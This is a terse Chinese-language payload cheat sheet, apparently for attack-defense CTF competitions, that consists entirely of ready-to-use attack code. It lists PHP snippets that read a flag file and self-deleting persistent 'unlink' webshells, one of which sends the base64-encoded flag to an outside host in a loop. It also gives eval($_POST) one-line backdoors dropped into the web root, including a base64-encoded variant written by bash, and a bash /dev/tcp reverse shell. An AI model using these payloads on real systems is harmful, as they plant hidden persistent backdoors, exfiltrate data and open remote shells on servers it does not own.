

1、直接输出flag
<?php echo file_get_contents("http://172.16.80.1:8000/flag.txt");?>
-----
<?php $ch = curl_init();curl_setopt($ch,CURLOPT_URL,'http://172.16.80.1:8000/flag.txt');echo curl_exec($ch);?>

2、unlink马
(1)写flag到本地文件中
<?php
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);

while (True){
    $f=base64_encode(file_get_contents('http://172.16.80.1:8000/flag.txt'));
    file_put_contents("/var/www/html/test/gf.txt",$f);
    sleep(5);
}
?>
---
(2)反弹flag
<?php
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);

while (True){
    $f=base64_encode(file_get_contents('http://172.16.80.1:8000/flag.txt'));
    file_get_contents("http://172.16.80.1:8000/?f=".$f);
    sleep(60);
}
?>

3、写一句话后门
<?php @eval($_POST["-7"]); ?>
<?php file_put_contents("/var/www/html/test/oo.php",base64_decode("PD9waHAgQGV2YWwoJF9QT1NUWyItNyJdKTsgPz4="));?> 

4、反弹shell
/bin/bash -c '/bin/bash </dev/tcp/ip/port 1>&0 2>&0'

5、bash写一句话
<?php @eval($_POST["-7"]); ?>
echo PD9waHAgQGV2YWwoJF9QT1NUWyItNyJdKTsgPz4= | /usr/bin/base64 -d > /var/www/html/test/1.php